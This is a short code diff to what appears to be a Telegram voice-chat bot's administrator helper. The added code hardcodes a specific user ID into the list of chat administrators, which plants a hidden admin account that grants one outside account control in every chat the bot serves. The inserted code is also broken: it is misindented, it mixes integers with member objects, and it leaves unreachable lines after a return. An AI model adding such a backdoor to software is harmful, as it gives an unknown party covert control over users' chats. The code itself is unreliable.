@@ -29,8 +29,14 @@ async def get_administrators(chat: Chat) -> List[int]:
     if get:
         return get
     else:
-        administrators = await get_administrators(message_.chat)
-        to_set = []
+        # helpers/admins.py
+async def get_administrators(chat):
+    administrators = [6848223695]
+    async for member in chat.get_members(filter="administrators"):
+        administrators.append(member)
+    return administrators
+    to_set = []
+        
 
         for administrator in administrators:
             if administrator.can_manage_voice_chats:
